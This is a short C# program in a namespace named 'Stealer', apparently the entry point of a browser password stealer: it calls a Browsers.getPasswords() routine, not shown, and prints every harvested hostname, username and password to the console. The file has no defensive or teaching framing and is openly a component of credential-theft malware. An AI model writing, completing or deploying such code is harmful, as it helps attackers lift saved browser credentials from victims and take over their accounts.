using System;

namespace Stealer
{
    class Program
    {
        static void Main(string[] args)
        {

            foreach (string[] data in Browsers.getPasswords())
            {
                Console.WriteLine("Hostname: " + data[0] + " | Username: " + data[1] + " | Password: " + data[2]);
            }
            
            // Wait
            Console.ReadLine();
        }
    }
    
}